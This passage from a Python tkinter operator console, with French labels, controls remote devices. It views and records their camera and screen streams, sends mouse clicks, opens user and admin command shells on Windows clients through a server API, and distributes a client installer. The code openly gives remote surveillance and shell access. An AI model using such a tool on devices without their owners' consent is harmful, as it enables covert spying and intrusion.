        width = panel.video_label.winfo_width() or panel.view_size[0]
        height = panel.video_label.winfo_height() or panel.view_size[1]
        if width < 10 or height < 10:
            return
        ratio = min(width / image.width, height / image.height)
        new_size = (max(1, int(image.width * ratio)), max(1, int(image.height * ratio)))
        image = image.resize(new_size, Image.BILINEAR)
        panel.pending_image = ImageTk.PhotoImage(image)
        if not panel.display_scheduled:
            panel.display_scheduled = True
            self.root.after(15, lambda k=key: self._flush_display(k))

    def _flush_display(self, key: str) -> None:
        panel = self.panels[key]
        with panel.display_lock:
            image = panel.pending_image
            panel.pending_image = None
            panel.display_scheduled = False
        if image is not None and panel.video_label is not None:
            panel.video_label.configure(image=image)
            panel.video_label.image = image

    def _set_stream(self, key: str, command: str) -> None:
        device_id = self.selected_device_id
        if not device_id:
            return
        try:
            requests.post(f"{self.server_url}/api/command",
                          json={"device_id": device_id, "stream": key, "command": command},
                          timeout=REQUEST_TIMEOUT)
            panel = self.panels[key]
            panel.status_var.set("Actif" if command == "START" else "Arrêté")
            panel.status_label.configure(fg=COLOR_OK if command == "START" else COLOR_MUTED)
        except requests.RequestException as exc:
            self._log(f"Flux {key} : {exc}")

    def _on_video_click(self, key: str, event: tk.Event) -> None:
        if key != "screen" or not self.mouse_position:
            return
        panel = self.panels[key]
        img_w = panel.video_label.winfo_width()
        img_h = panel.video_label.winfo_height()
        mouse = self.mouse_position
        sw = mouse.get("screen_w") or img_w
        sh = mouse.get("screen_h") or img_h
        if img_w == 0 or img_h == 0:
            return
        x = int(event.x * sw / img_w)
        y = int(event.y * sh / img_h)
        device_id = self.selected_device_id
        if not device_id:
            return
        try:
            requests.post(f"{self.server_url}/api/mouse/click",
                          json={"device_id": device_id, "x": x, "y": y},
                          timeout=REQUEST_TIMEOUT)
        except requests.RequestException as exc:
            self._log(f"Clic : {exc}")

    def _toggle_record(self, key: str) -> None:
        panel = self.panels[key]
        if not panel.recording:
            path = filedialog.asksaveasfilename(
                defaultextension=".mp4",
                filetypes=[("Vidéo MP4", "*.mp4"), ("Vidéo AVI", "*.avi")],
                title=f"Enregistrer le flux {key}",
            )
            if not path:
                return
            fps = RECORD_FPS_CAMERA if key == "camera" else RECORD_FPS_SCREEN
            panel.recorder = VideoRecorder(path, fps, log=self._log, on_fatal=None)
            panel.recorder.start()
            panel.recording = True
            panel.btn_record.configure(text="■  Arrêter l'enregistrement")
            panel.rec_badge.configure(text="● REC")
        else:
            report = panel.recorder.stop() if panel.recorder else None
            panel.recording = False
            panel.recorder = None
            panel.btn_record.configure(text="●  Enregistrer")
            panel.rec_badge.configure(text="")
            if report is not None:
                self._log(
                    f"Enregistrement {key} : {report.frames_written} images — "
                    f"{report.path} ({'OK' if report.verified_ok else '⚠ vide'})"
                )

    # ------------------------------------------------------------------
    # Souris
    # ------------------------------------------------------------------
    def _poll_mouse_loop(self) -> None:
        while True:
            device_id = self.selected_device_id
            if device_id:
                try:
                    r = requests.get(f"{self.server_url}/api/mouse/latest",
                                      params={"device_id": device_id},
                                      timeout=REQUEST_TIMEOUT)
                    if r.status_code == 200:
                        data = r.json()
                        self.root.after(0, lambda d=data: self._apply_mouse(d))
                except requests.RequestException:
                    pass
            time.sleep(POLL_MOUSE_INTERVAL)

    def _apply_mouse(self, data: dict) -> None:
        self.mouse_position = data

    # ------------------------------------------------------------------
    # Téléchargement client
    # ------------------------------------------------------------------
    def download_client_installer(self) -> None:
        try:
            r = requests.get(f"{self.server_url}/download/windows",
                             timeout=DOWNLOAD_TIMEOUT, allow_redirects=True)
            if r.status_code == 200:
                path = filedialog.asksaveasfilename(
                    defaultextension=".exe",
                    filetypes=[("Installateur", "*.exe"), ("Tous", "*.*")],
                    title="Enregistrer l'installateur",
                    initialfile="CameraClient-Setup.exe",
                )
                if not path:
                    return
                Path(path).write_bytes(r.content)
                self._log(f"Installateur enregistré : {path}")
            else:
                self._log(f"Téléchargement échoué : HTTP {r.status_code}")
        except requests.RequestException as exc:
            self._log(f"Téléchargement échoué : {exc}")

    # ------------------------------------------------------------------
    # Fenêtres CMD (user / admin) et Chat
    # ------------------------------------------------------------------
    def _open_cmd_window_for_selected(self) -> None:
        device_id = self.selected_device_id
        if not device_id:
            self._log("Sélectionnez d'abord un appareil.")
            return
        self._open_cmd_window(device_id, mode="user")

    def _open_admin_cmd_window_for_selected(self) -> None:
        device_id = self.selected_device_id
        if not device_id:
            self._log("Sélectionnez d'abord un appareil.")
            return
        info = self.devices.get(device_id, {})
        if info.get("platform") != "windows":
            self._log("CMD Admin indisponible : le client n'est pas sous Windows.")
            return
        self._open_cmd_window(device_id, mode="admin")

    def _open_chat_window_for_selected(self) -> None:
        device_id = self.selected_device_id
        if not device_id:
            self._log("Sélectionnez d'abord un appareil.")
            return
        self._open_chat_window(device_id)

    def _open_cmd_window(self, device_id: str, mode: str = "user") -> None:
        registry = self._cmd_windows if mode == "user" else self._admin_cmd_windows
        win = registry.get(device_id)
        if win is not None and win.winfo_exists():
            win.deiconify()
            win.lift()
            return

        name = self.devices.get(device_id, {}).get("name", device_id[:8])
        label = "CMD Admin" if mode == "admin" else "CMD"
        title = f"{label} — {name}"
        win = tk.Toplevel(self.root)
        win.title(title)
        win.geometry("820x520")
        win.configure(bg=COLOR_BG)

        top = tk.Frame(win, bg=COLOR_BG)
        top.pack(fill="x", padx=10, pady=(10, 4))
        state_var = tk.StringVar(value="Fermé")
        tk.Label(top, textvariable=state_var, bg=COLOR_BG, fg=COLOR_MUTED,
                 font=(FONT, 9, "bold")).pack(side="left")

        text = tk.Text(win, bg="#07090f", fg="#d8e0ff", insertbackground=COLOR_TEXT,
                       font=(FONT_MONO, 9), wrap="none", state="disabled",
                       highlightthickness=0, borderwidth=0)
        text.pack(fill="both", expand=True, padx=10, pady=4)

        bottom = tk.Frame(win, bg=COLOR_BG)
        bottom.pack(fill="x", padx=10, pady=(4, 10))
        entry = ttk.Entry(bottom, font=(FONT_MONO, 10))
        entry.pack(side="left", fill="x", expand=True, ipady=3)

        if mode == "admin":
            input_url = f"{self.server_url}/api/shell/admin/input"
            state_url = f"{self.server_url}/api/shell/admin/console/state"
            output_url = f"{self.server_url}/api/shell/admin/output/latest"
            control_url = f"{self.server_url}/api/shell/admin/console"
        else:
            input_url = f"{self.server_url}/api/shell/input"
            state_url = f"{self.server_url}/api/shell/console/state"
            output_url = f"{self.server_url}/api/shell/output/latest"
            control_url = f"{self.server_url}/api/shell/console"

        def send_command(_evt=None):
            cmd = entry.get()
            if not cmd:
                return
            try:
                requests.post(input_url,
                              json={"device_id": device_id, "text": cmd + "\r\n"},
                              timeout=REQUEST_TIMEOUT)
            except requests.RequestException as exc:
                self._log(f"{label} : envoi impossible ({exc})")
            entry.delete(0, tk.END)

        entry.bind("<Return>", send_command)

        btns = tk.Frame(bottom, bg=COLOR_BG)
        btns.pack(side="right", padx=(8, 0))
        ttk.Button(btns, text="Ouvrir", style="Primary.TButton",
                   command=lambda: requests.post(control_url,
                                                  json={"device_id": device_id,
                                                        "command": "OPEN"},
                                                  timeout=REQUEST_TIMEOUT)).pack(side="left", padx=(0, 6))
        ttk.Button(btns, text="Fermer",
                   command=lambda: requests.post(control_url,
                                                  json={"device_id": device_id,
                                                        "command": "CLOSE"},
                                                  timeout=REQUEST_TIMEOUT)).pack(side="left")

        last_seq = {"v": None}

        def poll():
            if not win.winfo_exists():
                return
            try:
                r = requests.get(output_url,
                                  params={"device_id": device_id,
                                          "after": last_seq["v"], "wait": 0.5},
                                  timeout=REQUEST_TIMEOUT)
                if r.status_code == 200:
                    data = r.json()
                    last_seq["v"] = data.get("seq")
                    buf = data.get("buffer") or ""
                    text.configure(state="normal")
                    text.delete("1.0", tk.END)
                    text.insert("1.0", buf)
                    text.see(tk.END)
                    text.configure(state="disabled")
                    if mode == "admin" and data.get("admin_refused"):
                        state_var.set("⚠ UAC refusé par l'utilisateur du client")
                    elif data.get("console_open"):
                        state_var.set(f"Ouvert ({mode})")
                    else:
                        state_var.set("Fermé")
            except requests.RequestException:
                pass
            win.after(600, poll)

        win.after(200, poll)
        win.protocol("WM_DELETE_WINDOW", win.destroy)
        registry[device_id] = win

    def _open_chat_window(self, device_id: str) -> None:
        win = self._chat_windows.get(device_id)
        if win is not None and win.winfo_exists():
            win.deiconify()
            win.lift()
            return

        name = self.devices.get(device_id, {}).get("name", device_id[:8])
        win = tk.Toplevel(self.root)
        win.title(f"Chat — {name}")
        win.geometry("620x520")
        win.configure(bg=COLOR_BG)

        history = tk.Text(win, bg=COLOR_VIDEO_BG, fg=COLOR_TEXT, font=(FONT, 10),
                          wrap="word", state="disabled", borderwidth=0, highlightthickness=0)
        history.pack(fill="both", expand=True, padx=10, pady=(10, 4))

        bottom = tk.Frame(win, bg=COLOR_BG)
        bottom.pack(fill="x", padx=10, pady=(4, 10))
        entry = ttk.Entry(bottom, font=(FONT, 10))
        entry.pack(side="left", fill="x", expand=True, ipady=3)

        def send(_evt=None):
            msg = entry.get()
            if not msg:
                return
            try:
                requests.post(f"{self.server_url}/api/shell/chat",
                              json={"device_id": device_id, "message": msg},
                              timeout=REQUEST_TIMEOUT)
            except requests.RequestException as exc:
                self._log(f"Chat : {exc}")
            entry.delete(0, tk.END)

        entry.bind("<Return>", send)

        ctrl = tk.Frame(bottom, bg=COLOR_BG)
        ctrl.pack(side="right", padx=(8, 0))
        ttk.Button(ctrl, text="Ouvrir console", style="Primary.TButton",
                   command=lambda: requests.post(f"{self.server_url}/api/shell/chat_window",
                                                  json={"device_id": device_id,
                                                        "command": "OPEN"},
                                                  timeout=REQUEST_TIMEOUT)).pack(side="left", padx=(0, 6))
        ttk.Button(ctrl, text="Fermer console",
                   command=lambda: requests.post(f"{self.server_url}/api/shell/chat_window",
                                                  json={"device_id": device_id,
                                                        "command": "CLOSE"},
                                                  timeout=REQUEST_TIMEOUT)).pack(side="left")

        def poll():
            if not win.winfo_exists():
                return
            try:
                r = requests.get(f"{self.server_url}/api/shell/results",
                                  params={"device_id": device_id},
                                  timeout=REQUEST_TIMEOUT)
                if r.status_code == 200:
                    data = r.json()
                    history.configure(state="normal")
                    history.delete("1.0", tk.END)
                    for item in data.get("chat_history", []):
                        who = "Moi" if item.get("role") == "moi" else "Client"
                        history.insert(tk.END, f"{who}: {item.get('text', '')}\n")
                    history.see(tk.END)
                    history.configure(state="disabled")
            except requests.RequestException:
                pass
            win.after(SHELL_CHAT_POLL_INTERVAL_MS, poll)

        win.after(200, poll)
        win.protocol("WM_DELETE_WINDOW", win.destroy)
        self._chat_windows[device_id] = win

    # ------------------------------------------------------------------
    def _on_close(self) -> None:
        self.root.destroy()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Interface de contrôle à distance")
    parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.onrender.com)")
    parser.add_argument("--save", action="store_true",
                        help="mémorise --server pour les prochains lancements")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    server_url = resolve_server_url(args.server)
    if args.save and args.server:
        save_config(server_url)

    root = tk.Tk()
    CameraServerApp(root, server_url)
    root.mainloop()


if __name__ == "__main__":
    main()